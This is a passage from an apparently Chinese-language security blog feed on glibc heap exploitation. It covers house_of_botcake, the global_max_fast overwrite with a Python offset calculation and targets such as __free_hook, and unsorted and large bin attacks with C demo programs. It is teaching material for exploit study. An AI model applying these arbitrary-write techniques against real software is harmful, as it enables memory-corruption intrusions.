class="hljs-keyword">uint64_t</span>)(&amp;victim);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, you can control tcache list to alloc arbitrary address\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <br>    <span class="hljs-keyword">char</span> *target = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Before attack, victim&#x27;s value: 0x%lx\n&quot;</span>, victim);<br>    *(<span class="hljs-keyword">uint64_t</span>*)target = <span class="hljs-number">0xdeadbeef</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;After attack, victim&#x27;s value: 0x%lx\n&quot;</span>, victim);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>释放 7 个 0x100 的堆块填满 tcache。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20221117131357835.png"><span class="image-caption">image-20221117131357835</span></p>
<p>再释放两个同样为 0x100 的堆块，这两个堆块会进行合并。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20221117132805303.png"><span class="image-caption">image-20221117132805303</span></p>
<p>申请一个 0x100 的堆块，空出一个 tcache bin。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20221117133743383.png"><span class="image-caption">image-20221117133743383</span></p>
<p>然后利用 UAF 再次释放合并进入到 unsorted bin 的堆块，造成了存在一个堆块即在 tcache 里，又在 unsorted bin 里。这里的堆块不能选择释放头部，因为那样会变成让 0x220 的堆块进入到 tcache。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20221117134045922.png"><span class="image-caption">image-20221117134045922</span></p>
<p>申请一个大于 0x100 的堆块，绕开 tcache，而获得到了 unsorted bin 里的堆块，但是这个堆块可以覆盖存在于 tcache 里的堆块，最终造成可以地址分配堆块，任意地址写。</p>
<p><img src="/2022/03/14/2022-03-14-glibc-2.31%E7%89%88%E6%9C%AC%E5%88%A9%E7%94%A8/image-20221117134330799.png"><span class="image-caption">image-20221117134330799</span></p>
<h3 id="house-of-botcake利用总结"><a href="#house-of-botcake利用总结" class="headerlink" title="house_of_botcake利用总结"></a>house_of_botcake利用总结</h3><p>前提：拥有 UAF</p>
<ul>
<li>释放七个 size 满足进入 unsorted bin 的堆块填满 tcache，再释放两个同样 size 的堆块 a b (a前，b后)进入到 unsorted bin</li>
<li>申请回一个 tcache，然后利用 UAF 释放堆块 b</li>
<li>申请一个大于 size 的堆块，此时可以通过该堆块完成对 b 堆块的覆盖，并且 b 堆块仍然在 tcache 里。</li>
</ul>
]]></content>
      <tags>
        <tag>glibc</tag>
      </tags>
  </entry>
  <entry>
    <title>global_max_fast</title>
    <url>/2022/03/03/2022-01-12-global-max-fast/</url>
    <content><![CDATA[<p>文章来源：<a href="https://xz.aliyun.com/t/5082#toc-8">https://xz.aliyun.com/t/5082#toc-8</a></p>
<h1 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global_max_fast"></a>global_max_fast</h1><p>此次的源码是基于<code>libc-2.23</code>的，后续的版本加入了<code>tcache</code>，该机制相对来说比较简单与独立，所以还是基于2.23进行相应的分析，在64位系统上进行。<br><code>global_max_fast</code>这个全局变量的作用是用来标志<code>fastbin</code>的大小的阈值，小于这个值的堆块会被认为是fastbin，使用fastbin的相应机制进行管理。看下它的定义：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                           \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> get_max_fast() global_max_fast</span><br></code></pre></td></tr></table></figure>

<p><code>set_max_fast</code>初始化函数开始是在<code>malloc_init_state</code>调用的，可以看到这个宏定义的作用是设置<code>global_max_fast</code>默认值，默认值是0x80。</p>
<p>然后看<code>malloc</code>中对于<code>fastbin</code>的处理，fastbin处理很简单，就是找到对应的fastbin的单链表，并从中取出堆块，如果size检查通过就将该堆块返回：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (<span class="hljs-built_in">get_max_fast</span> ()))<br>    &#123;<br>      idx = <span class="hljs-built_in">fastbin_index</span> (nb);<br>      mfastbinptr *fb = &amp;<span class="hljs-built_in">fastbin</span> (av, idx);  ## 找到对应的单链表<br>      mchunkptr pp = *fb;<br>      <span class="hljs-keyword">do</span><br>        &#123;<br>          victim = pp;<br>          <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>      <span class="hljs-keyword">while</span> ((pp = <span class="hljs-built_in">catomic_compare_and_exchange_val_acq</span> (fb, victim-&gt;fd, victim))<br>             != victim);<br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (__builtin_expect (<span class="hljs-built_in">fastbin_index</span> (<span class="hljs-built_in">chunksize</span> (victim)) != idx, <span class="hljs-number">0</span>))  ## 检查size<br>            &#123;<br>              errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>            errout:<br>              <span class="hljs-built_in">malloc_printerr</span> (check_action, errstr, <span class="hljs-built_in">chunk2mem</span> (victim), av);<br>              <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>            &#125;<br>          <span class="hljs-built_in">check_remalloced_chunk</span> (av, victim, nb);<br>          <span class="hljs-keyword">void</span> *p = <span class="hljs-built_in">chunk2mem</span> (victim);<br>          <span class="hljs-built_in">alloc_perturb</span> (p, bytes);<br>          <span class="hljs-keyword">return</span> p;  #返回<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>查看free中的fastbin相关的处理源码：</p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">if</span> ((unsigned long)(size) &lt;= (unsigned long)(get_max_fast ())<br><br>    ...<br>    <span class="hljs-comment">## 对size进行基本的检查</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-function"><span class="hljs-params">(__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)</span></span><br><span class="hljs-params"><span class="hljs-function">    || __builtin_expect (chunksize (chunk_at_offset (p, size))</span></span><br><span class="hljs-params"><span class="hljs-function">                 &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))</span></span><br><span class="hljs-function">      &#123;</span><br><span class="hljs-function">    ...</span><br><span class="hljs-function">    ## 对<span class="hljs-title">next</span> <span class="hljs-title">chunk</span>的<span class="hljs-title">size</span>进行检查</span><br><span class="hljs-function">    <span class="hljs-title">if</span> <span class="hljs-params">(chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ</span></span><br><span class="hljs-params"><span class="hljs-function">            || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span></span><br><span class="hljs-params"><span class="hljs-function">          &#125;)</span>)</span><br><span class="hljs-function">      &#123;</span><br><span class="hljs-function">        <span class="hljs-title">errstr</span> = &quot;<span class="hljs-title">free</span><span class="hljs-params">()</span>: <span class="hljs-title">invalid</span> <span class="hljs-title">next</span> <span class="hljs-title">size</span> <span class="hljs-params">(fast)</span>&quot;;</span><br><span class="hljs-function">        <span class="hljs-title">goto</span> <span class="hljs-title">errout</span>;</span><br><span class="hljs-function">      &#125;</span><br><span class="hljs-function">    ...</span><br><span class="hljs-function"></span><br><span class="hljs-function">    ## 获取对应的<span class="hljs-title">fastbin</span> <span class="hljs-title">index</span></span><br><span class="hljs-function">    <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">idx</span> = <span class="hljs-title">fastbin_index</span><span class="hljs-params">(size)</span>;</span><br><span class="hljs-function">    <span class="hljs-title">fb</span> = &amp;<span class="hljs-title">fastbin</span> <span class="hljs-params">(av, idx)</span>;</span><br><span class="hljs-function"></span><br><span class="hljs-function">    ...</span><br><span class="hljs-function"></span><br><span class="hljs-function">    <span class="hljs-title">do</span></span><br><span class="hljs-function">      &#123;</span><br><span class="hljs-function">    /* <span class="hljs-title">Check</span> <span class="hljs-title">that</span> <span class="hljs-title">the</span> <span class="hljs-title">top</span> <span class="hljs-title">of</span> <span class="hljs-title">the</span> <span class="hljs-title">bin</span> <span class="hljs-title">is</span> <span class="hljs-title">not</span> <span class="hljs-title">the</span> <span class="hljs-title">record</span> <span class="hljs-title">we</span> <span class="hljs-title">are</span> <span class="hljs-title">going</span> <span class="hljs-title">to</span> <span class="hljs-title">add</span></span><br><span class="hljs-function">       <span class="hljs-params">(i.e., double free)</span>.  */</span><br><span class="hljs-function">    <span class="hljs-title">if</span> <span class="hljs-params">(__builtin_expect (old == p, <span class="hljs-number">0</span>))</span></span><br><span class="hljs-function">        <span class="hljs-title">errstr</span> = &quot;<span class="hljs-title">double</span> <span class="hljs-title">free</span> <span class="hljs-title">or</span> <span class="hljs-title">corruption</span> <span class="hljs-params">(fasttop)</span>&quot;;</span><br><span class="hljs-function">        <span class="hljs-title">goto</span> <span class="hljs-title">errout</span>;</span><br><span class="hljs-function">      &#125;</span><br><span class="hljs-function">      ...</span><br><span class="hljs-function">    <span class="hljs-title">p</span>-&gt;</span>fd = old2 = old;<br>      &#125;<br></code></pre></td></tr></table></figure>

<p>对于fastbin的free过程主要包括如下：</p>
<ol>
<li>对释放的堆块的size进行基本的检查。</li>
<li>对释放堆块的下一个堆块的size进行基本的检查。</li>
<li>获取释放堆块所对应的fastbin链表对应的索引。</li>
<li>检查是否是double free。</li>
<li>释放进单链表。</li>
</ol>
<p>fastbin的单链表管理是比较简单的，与<code>global_max_fast</code>相关且需要注意的代码则是 fastbin 所对应的 index 获取以及 index所对应的指针获取的代码，即<code>fastbin_index</code>宏以及<code>fastbin</code>宏，对应代码如下：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#define</span> fastbin_index(sz) \<br>  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == <span class="hljs-number">8</span> ? <span class="hljs-number">4</span> : <span class="hljs-number">3</span>)) - 2)<br><br><span class="hljs-selector-id">#define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY<span class="hljs-selector-attr">[idx]</span>)<br></code></pre></td></tr></table></figure>

<p>可以看到这两个宏仅仅是利用偏移来定位数组的指针，但是 arena 所对应的<code>malloc_state</code>中 fastbins 数组相关的定义为：</p>
<figure class="highlight less"><table><tr><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">mfastbinptr</span> <span class="hljs-selector-tag">fastbinsY</span><span class="hljs-selector-attr">[NFASTBINS]</span><br><br><span class="hljs-selector-id">#define</span> <span class="hljs-selector-tag">NFASTBINS</span>  (fastbin_index (request2size (MAX_FAST_SIZE)) + <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<p>到这里问题就比较明显了，如果可以改写<code>global_max_fast</code>为一个较大的值，然后释放一个较大的堆块时，由于fastbins数组空间是有限的，其相对偏移将会往后覆盖，如果释放堆块的size可控，就可实现往fastbins数组（main_arena）后的<code>任意地址</code>写入所释放堆块的地址。</p>
<p>即利用<code>global_max_fast</code>进行相关的攻击</p>
<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>对于<code>global_max_fast</code>的利用首先要解决的事情是如何覆盖<code>global_max_fast</code>。适用的场景应是存在任意地址写的漏洞，但是写入的值却是不可控的（也是一个比较大的值），因为如果写入的值也是可控的话就不需要使用这个方法就能解决了，最典型的应该是<code>unsorted bin attack</code>，可实现往任意地址写入main_arena中的地址。</p>
<p>前置条件我想大概可能是需要泄露一个libc的地址，否则的话可能会像<code>heap_master</code>中一样需要爆破4bit的地址。</p>
<p>实现任意地址写的方式是：通过地址与fastbin数组的偏移计算出所需<code>free</code>的堆块的size，然后释放相应的堆块，即可实现往该地址写入堆块的地址以进一步利用。</p>
<p>计算偏移的代码可以如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">fastbin_ptr = libc_base + libc.symbols[<span class="hljs-string">&#x27;main_arena&#x27;</span>] + <span class="hljs-number">8</span><br>idx = (target_addr-fastbin_ptr)/<span class="hljs-number">8</span><br>size = idx*<span class="hljs-number">0x10</span> + <span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">size = (target_addr - main_arena - <span class="hljs-number">0x18</span>) * <span class="hljs-number">2</span> + <span class="hljs-number">0x20</span><br></code></pre></td></tr></table></figure>

<p>此时要解决的事情是往哪里写以达到实现利用的目的。可能有很多的地方，理论上来说只要是<code>main_arena</code>结构体后面的是函数指针或是结构体指针的地址都可以，目前很容易能够预想到的是：</p>
<ul>
<li>_IO_list_all</li>
<li>stdout</li>
<li>stdin</li>
<li>stderr</li>
<li>__free_hook</li>
</ul>
<p>复写前面四个就是使用<code>IO_file</code>攻击那一套方法，伪造结构体来实现任意读任意写或者伪造 vtable 来实现<code>house of orange</code>攻击。</p>
<p>复写<code>__free_hook</code>的话则需要一次uaf来把fd改成<code>system</code>或者<code>one gadget</code>，再将堆块申请出来，从而实现将<code>__free_hook</code>改写成<code>system</code>或者<code>one gadget</code>。因为在 malloc 的时候会把 fastbinsY 的链表头部取出，并且把其 fd 位置的内容作为链表头部写入到 fastbinsY 数组中，而在这个过程中没有对可控堆块的 fd 位置的内容的合法性做检查。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p><code>global_max_fast</code>的一些相关场景包括：</p>
<ul>
<li>可能能够得到libc地址。</li>
<li>能够控制free堆块的size。</li>
<li>能往任意地址写但是却无法控制写的内容。</li>
</ul>
<p>以此来实现往<code>main_arena</code>后面的任意地址写堆块地址的效果，以实现后续的利用，相关的漏洞利用方式包括<code>unsorted bin attack</code>以及 house of orange（IO file）等。</p>
]]></content>
      <tags>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>large bin attack</title>
    <url>/2022/02/28/2022-02-28-large-bin-attack/</url>
    <content><![CDATA[<h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h1><p>在进入到large bin attack 前，先对已经在高版本失效的unsorted bin attack 进行缅怀一下。</p>
<p>利用前提是有UAF，修改 unsorted bin 中的FD字段为0，BK字段为 target addr - 0x10，然后malloc一个相同大小的chunk，即可在目标地址写入 unsorted bin 的地址，一般用来伪造堆头（制造出0x7f）、修改次数限制、上限信息、配合局部写等，十分好用。</p>
<p>在 glibc-2.27以上的版本都已失效，但是本文主角 large bin attack以及另一种攻击手法 tcache_unlink_attack 在高版本的利用中可以成为它的代替品。</p>
<p>下面最先介绍的 large bin attack 只适用于 glibc-2.30 以下的版本</p>
<h1 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h1><h2 id="large-bin原理"><a href="#large-bin原理" class="headerlink" title="large bin原理"></a>large bin原理</h2><h3 id="size与index"><a href="#size与index" class="headerlink" title="size与index"></a>size与index</h3><p>在源码中，不在small bin 范围内的 chunk 归类到 large bin 里，small bin 的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT  <span class="hljs-comment">//64位中：MALLOC_ALIGNMENT=0x10</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br></code></pre></td></tr></table></figure>

<p>根据最后一个宏定义可知：在64位的系统里面大于<code>MIN_LARGE_SIZE</code>为<code>64*0x10</code>即<code>0x400</code>的chunk为largebin**</p>
<p>largebin中不再是一个 index 对应一个大小的size，而是存储等差数列变化的chunk，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> largebin_index_64(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-meta-string">&lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-meta-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-meta-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 15) <span class="hljs-meta-string">&lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;</span>&gt; 15) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 18) <span class="hljs-meta-string">&lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;</span>&gt; 18) :\</span><br><span class="hljs-meta">   126)</span><br></code></pre></td></tr></table></figure>

<p>如果把0x400的chunk代入其中，其对应的index为 48+(0x400&gt;&gt;6)即为64。具体index对应的size如下表：</p>
<table>
<thead>
<tr>
<th align="center">size</th>
<th align="center">index</th>
</tr>
</thead>
<tbody><tr>
<td align="center">[0x400 , 0x440)</td>
<td align="center">64</td>
</tr>
<tr>
<td align="center">[0x440 , 0x480)</td>
<td align="center">65</td>
</tr>
<tr>
<td align="center">[0x480 , 0x4C0)</td>
<td align="center">66</td>
</tr>
<tr>
<td align="center">[0x4C0 , 0x500)</td>
<td align="center">67</td>
</tr>
<tr>
<td align="center">[0x500 , 0x540)</td>
<td align="center">68</td>
</tr>
<tr>
<td align="center">等差 0x40</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">[0xC00 , 0xC40)</td>
<td align="center">96</td>
</tr>
<tr>
<td align="center">[0xC40 , 0xE00)</td>
<td align="center">97</td>
</tr>
<tr>
<td align="center">[0xE00 , 0x1000)</td>
<td align="center">98</td>
</tr>
<tr>
<td align="center">[0x1000 , 0x1200)</td>
<td align="center">99</td>
</tr>
<tr>
<td align="center">[0x1200 , 0x1400)</td>
<td align="center">100</td>
</tr>
<tr>
<td align="center">[0x1400 , 0x1600)</td>
<td align="center">101</td>
</tr>
<tr>
<td align="center">等差 0x200</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">[0x2800 , 0x2A00)</td>
<td align="center">111</td>
</tr>
<tr>
<td align="center">[0x2A00 , 0x3000)</td>
<td align="center">112</td>
</tr>
<tr>
<td align="center">[0x3000 , 0x4000)</td>
<td align="center">113</td>
</tr>
<tr>
<td align="center">[0x4000 , 0x5000)</td>
<td align="center">114</td>
</tr>
<tr>
<td align="center">等差 0x1000</td>
<td align="center">…</td>
</tr>
<tr>
<td align="center">[0x9000 , 0xA000)</td>
<td align="center">119</td>
</tr>
<tr>
<td align="center">[0xA000 , 0x10000)</td>
<td align="center">120</td>
</tr>
<tr>
<td align="center">[0x10000 , 0x18000)</td>
<td align="center">121</td>
</tr>
<tr>
<td align="center">[0x18000 , 0x20000)</td>
<td align="center">122</td>
</tr>
<tr>
<td align="center">[0x20000 , 0x28000)</td>
<td align="center">123</td>
</tr>
<tr>
<td align="center">[0x28000 , 0x40000)</td>
<td align="center">124</td>
</tr>
<tr>
<td align="center">[0x40000 , 0x80000)</td>
<td align="center">125</td>
</tr>
<tr>
<td align="center">[0x80000 , …. )</td>
<td align="center">126</td>
</tr>
</tbody></table>
<h3 id="链表维护方式"><a href="#链表维护方式" class="headerlink" title="链表维护方式"></a>链表维护方式</h3><p>不同大小的large chunk：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *gap;<br><br>    <span class="hljs-keyword">char</span> *ptr0=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//A</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x450</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//B</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x460</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//C</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//D</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">free</span>(ptr3);<br>    <span class="hljs-built_in">free</span>(ptr0);<br>    <span class="hljs-built_in">free</span>(ptr1);<br><br>    gap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x480</span>); <span class="hljs-comment">//trigger that sort largebin from unsorted bin to largebins</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301201027678.png"><span class="image-caption">image-20220301201027678</span></p>
<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301201049004.png"><span class="image-caption">image-20220301201049004</span></p>
<p>可以看见，即使free的顺序是打乱的，但是最终进入到large bin 中，无论是从<code>fd</code>看还是<code>fd_nextsize</code>看，都是从大到小的顺序排序。</p>
<p>相同大小的large chunk：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *gap;<br><br>    <span class="hljs-keyword">char</span> *ptr0=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//A</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//B</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//C</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//D</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br><br>    <span class="hljs-built_in">free</span>(ptr2);<br>    <span class="hljs-built_in">free</span>(ptr3);<br>    <span class="hljs-built_in">free</span>(ptr0);<br>    <span class="hljs-built_in">free</span>(ptr1);<br><br>    gap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x480</span>); <span class="hljs-comment">//trigger that sort largebin from unsorted bin to largebins</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301201438370.png"><span class="image-caption">image-20220301201438370</span></p>
<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301202717282.png"><span class="image-caption">image-20220301202717282</span></p>
<p>先释放的堆块C为堆头，由于不存在比它大或比它小的堆块，因此它的<code>fd_nextsize</code>和<code>bk_nextsize</code>都是指向自己。其余释放的堆块按释放的顺序，逆序排列在链表中，且它们的<code>fd_nextsize</code>和<code>bk_nextsize</code>均为0，它们通过<code>fd</code>与<code>bk</code>进行链接</p>
<p>既存在相同大小，又存在不同大小的堆块：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *gap;<br><br>    <span class="hljs-keyword">char</span> *ptr0=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//A</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x450</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//B</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x460</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//C</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr3=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//D</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr4=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x440</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//E</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr5=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x450</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//F</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr6=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x460</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//G</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">char</span> *ptr7=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x470</span><span class="hljs-number">-0x10</span>); <span class="hljs-comment">//H</span><br>    gap=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(ptr2); <span class="hljs-comment">//C</span><br>    <span class="hljs-built_in">free</span>(ptr3); <span class="hljs-comment">//D</span><br>    <span class="hljs-built_in">free</span>(ptr0); <span class="hljs-comment">//A</span><br>    <span class="hljs-built_in">free</span>(ptr1); <span class="hljs-comment">//B</span><br>    <span class="hljs-built_in">free</span>(ptr7); <span class="hljs-comment">//H</span><br>    <span class="hljs-built_in">free</span>(ptr6); <span class="hljs-comment">//G</span><br>    <span class="hljs-built_in">free</span>(ptr5); <span class="hljs-comment">//F</span><br>    <span class="hljs-built_in">free</span>(ptr4); <span class="hljs-comment">//E</span><br>    gap = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x480</span>); <span class="hljs-comment">//trigger that sort largebin from unsorted bin to largebins</span><br><br>    <span 